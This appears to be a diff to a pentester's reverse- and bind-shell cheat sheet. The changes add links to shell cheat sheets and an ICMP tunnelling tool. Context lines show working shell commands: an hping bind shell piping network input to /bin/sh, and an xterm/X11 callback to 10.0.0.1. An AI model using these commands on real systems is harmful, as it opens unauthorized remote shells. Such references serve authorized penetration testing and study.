@@ -21,6 +21,7 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 http://bernardodamele.blogspot.fr/2011/09/reverse-shells-one-liners.html
 http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
 fuzzdb/attack-payloads/os-cmd-execution/reverse-shell-one-liners.doc.txt
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 ## bind shell with hping and uid 0
 hping -I eth0 -p 22 --listen s3cr3t | /bin/sh
@@ -35,6 +36,7 @@ soicmp (written in python & needs pcapy+libpcap on client)
 icmpshell (wirtten in c & no deps, bind shell only)
 icmpsh (client only windows)
 tcpovericmp (https://github.com/Maksadbek/tcpovericmp)
+icmptunnel (https://github.com/DhavalKapil/icmptunnel)
 
 ## sctp
 python-pty-shells
@@ -186,6 +188,7 @@ moi: Xnest :1 ; xhost +targetip
 xterm -display 10.0.0.1:1
 
 # awk
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 # nodejs
 https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
